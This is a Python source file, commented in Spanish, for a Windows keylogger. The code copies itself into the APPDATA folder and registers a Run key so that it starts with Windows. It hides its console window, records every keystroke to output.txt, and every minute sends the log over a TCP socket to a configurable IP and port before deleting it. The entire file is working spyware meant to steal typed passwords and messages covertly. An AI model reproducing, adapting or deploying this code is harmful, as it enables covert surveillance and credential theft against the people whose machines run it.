import keyboard
import sys
import socket
import os
import time
import threading
import sched
import win32gui
import winreg
import win32console
import shutil

# Obtenemos el nombre del archivo del programa
filename = os.path.basename(sys.argv[0])

# # Obtenemos el directorio de appdata del usuario
appdata = os.getenv('APPDATA')

# Obtenemos la ruta completa del archivo en el directorio de appdata
appdata_path = os.path.join(appdata, filename)

# Si el archivo no está en el directorio de appdata, lo copiamos
if not os.path.exists(appdata_path):
    shutil.copy2(sys.argv[0], appdata_path)

# Obtenemos la clave del registro de Windows para ejecutar programas al iniciar el sistema
run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
# Intentamos obtener el valor de la entrada con el nombre del archivo
try:
    value, _ = winreg.QueryValueEx(run_key, filename)
# Si no existe la entrada, la creamos con la ruta del archivo en el directorio de appdata
except FileNotFoundError:
    winreg.SetValueEx(run_key, filename, 0, winreg.REG_SZ, appdata_path)
# Cerramos la clave del registro
winreg.CloseKey(run_key)

# Obtenemos el identificador de la ventana del proceso
hwnd = win32console.GetConsoleWindow()
# Ocultamos la ventana del proceso
win32gui.ShowWindow(hwnd, 0)



# Cada palabra capturada se resetea en esta variable:
palabra = ""
# Donde enviamos el .txt
direccion_ip = '127.0.0.1'
puerto = 8080
archivo = 'output.txt'

def ejecutar_envio_programado(scheduler, archivo, direccion_ip, puerto):
    enviar_archivo_via_sockets(archivo, direccion_ip, puerto)
    scheduler.enter(60, 1, ejecutar_envio_programado, (scheduler, archivo, direccion_ip, puerto))

# Configurar el planificador de eventos
scheduler = sched.scheduler(time.time, time.sleep)
scheduler.enter(60, 1, ejecutar_envio_programado, (scheduler, archivo, direccion_ip, puerto))

# Iniciar el hilo del planificador
thread = threading.Thread(target=scheduler.run)
thread.start()

# Función para registrar cada palabra presionada en la variable palabra:
def on_key_event(e):

    global palabra

    if e.event_type == keyboard.KEY_DOWN:
    
        if e.name == 'enter':
            guardar_palabra()
        if e.name == 'space':
            e.name = ' '
            palabra += e.name
        if e.name == 'ctrl':
            e.name = '^'
            palabra += e.name
        elif len(e.name) == 1 and e.name.isprintable():
            palabra += e.name

# Cada palabra se imprime por pantalla.
def guardar_palabra():
    if not os.path.exists("output.txt"):
        # Si el archivo no existe, se crea con permisos de escritura.
        with open("output.txt", "w"):
            pass

    with open("output.txt", "a") as file:
        file.write(palabra + "\n")
    resetear_palabra() # Llamamos a la función que se encarga de resetear la variable después de presionar espacio.

# Función para que se vaya registrando en la variable cada palabra al presionar espacio.
def resetear_palabra():
    global palabra
    palabra = ""

def enviar_archivo_via_sockets(archivo, direccion_ip, puerto):
    while True:
        try:
            with open(archivo, 'rb') as file:
                contenido = file.read()
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((direccion_ip, puerto))
                s.sendall(contenido)
                os.remove("output.txt")
                time.sleep(10)
        except Exception as e:
            time.sleep(10)

def detener_script():
    keyboard.unhook_all()  # Desvincular todos los eventos de teclado



keyboard.hook(on_key_event)

try:
    keyboard.wait()
except KeyboardInterrupt:
    # Manejar la excepción cuando se presiona Ctrl+C fuera del bucle
    detener_script()


